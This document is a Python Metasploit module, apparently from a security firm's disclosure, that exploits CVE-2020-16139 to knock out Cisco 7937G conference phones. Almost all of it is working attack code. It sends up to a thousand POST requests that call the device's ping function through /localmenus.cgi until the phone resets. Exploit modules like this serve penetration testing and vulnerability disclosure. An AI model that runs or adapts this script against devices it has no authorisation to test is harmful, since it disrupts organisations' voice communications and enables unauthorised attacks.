#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
from metasploit import module
import logging

# extra modules
requests_missing = False
random_missing = False
string_missing = False

try:
    import requests
except ImportError:
    requests_missing = True
try:
    import random
except ImportError:
    random_missing = True
try:
    import string
except ImportError:
    string_missing = True

metadata = {
    'name': 'Cisco 7937G Denial-of-Service Reboot Attack',
    'description': '''
	This module exploits a bug in how the conference station handles 
	executing a ping via its web interface. By repeatedly executing 
	the ping function without clearing out the resulting output, 
	a DoS is caused that will reset the device after a few minutes.
    ''',
    'authors': [
        'Cody Martin'
	# Author Homepage: debifrank.github.io
	# Organization: BlackLanternSecurity
	# Org. Homepage: BlackLanternSecurity.com
    ],
    'date': '2020-06-02',
    'license': 'GPL_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://blacklanternsecurity.com/2020-08-07-Cisco-Unified-IP-Conference-Station-7937G/'},
        {'type': 'cve', 'ref': '2020-16139'}
    ],
    'type': 'dos',
    'options': {
        'rhost': {'type': 'address', 
		  'description': 'Target address', 
		  'required': True, 
		  'default': 'None'}
    }
}

def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if requests_missing:
        logging.error('Required Python module dependency (requests) is missing.')
        logging.error('Please execute pip3 install requests.')
        return
    if random_missing:
        logging.error('Required Python module dependency (random) is missing.')
        logging.error('Please execute pip3 install random.')
    if string_missing:
        logging.error('Required Python module dependency (string) is missing.')
        logging.error('Please execute pip3 install string.')

    url = "http://{}/localmenus.cgi".format(args['rhost'])
    data = ''.join(random.choice(string.ascii_letters) for i in range(46))
    payload = {"func": "609", "data": data, "rphl": "1"}
    logging.info("Sending POST requests triggering the PING function.")
    logging.info("Device should crash with a DoS shortly...")
    for i in range(1000):
        try:
            r = requests.post(url=url, params=payload, timeout=5)
            if r.status_code != 200:
                logging.error("Device doesn't appear to be functioning or web access is not enabled.")
                return
        except requests.exceptions.ReadTimeout as e:
            logging.info('DoS reset attack completed!')
            return
        except requests.exceptions.RequestException as e:
            logging.info('An unexpected exception occurred: ' + str(e))
            logging.info('The device may be DoS\'d already or not have web access enabled.')
            return


if __name__ == '__main__':
    module.run(metadata, run)
